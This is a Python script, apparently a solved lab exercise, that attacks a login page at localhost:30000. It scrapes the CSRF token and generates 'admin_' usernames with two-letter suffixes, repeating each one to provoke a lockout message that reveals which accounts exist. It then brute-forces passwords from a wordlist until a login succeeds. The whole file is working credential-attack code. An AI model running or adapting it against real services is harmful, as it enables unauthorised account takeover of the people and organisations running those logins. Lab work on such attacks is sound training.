#!/usr/bin/python3
import string, requests

loginDetails = {
    "username": "admin",
    "password": "SecretPwd!" # Palceholder for password. Change to expected needs.
}

# Login URL
loginUrl = "http://localhost:30000/"

# Get the CSRF token. Optional but useful when CSRF tokens are necessary for websites.
session = requests.Session()
res = session.get(loginUrl)
loginDetails["csrfmiddlewaretoken"] = res.text.split("csrfmiddlewaretoken\" value=\"")[-1].split("\"")[0]

# Get all passwords from the password list
passwords = list()
with open("/home/labDirectory/passwords.lst", "rt") as f:
    for line in f.readlines():
        passwords.append(line.strip())

# Create all possible admin usernames and store it in usernames list
usernames = list()
########## Write code to create all possible admin usernames as per the problem statement here ##########
# ...
# Loop through all combinations of two lowercase letters
for first_char in string.ascii_lowercase:
    for second_char in string.ascii_lowercase:
        username = f"admin_{first_char}{second_char}"
        # Append the string 6 times to the list
        usernames.extend([username] * 6)
#########################################################################################################

def printFinalOutput(data):
    print(f"\t[+] Found a valid username:password pair--> {data['username']} : {data['password']}")

# Finding the username
for index,username in enumerate(usernames):
    loginDetails["username"] = username
    loginDetails["password"] = '12345678'
    print(f"[*] Bruteforce attempt #{index}, Trying Username: {loginDetails['username']}")
    response = session.post(loginUrl, data=loginDetails)
    if response.status_code == 200 and "Too many invalid login attempts! Login to user:" in response.text:
      for index,password in enumerate(passwords):
        loginDetails["password"] = password
        print(f"[*] Bruteforce attempt #{index}, Trying password: {loginDetails['password']}")
        response = session.post(loginUrl, data=loginDetails)
        if "Incorrect Username or Password." not in response.text and "Too many invalid login attempts! Login to user:" not in response.text:
          printFinalOutput(loginDetails) # Send the password for final output
          exit(0)
          loginDetails["csrfmiddlewaretoken"] = response.text.split("csrfmiddlewaretoken\" value=\"")[-1].split("\"")[0]


print("[-] No Password found for admin user")
      
      
      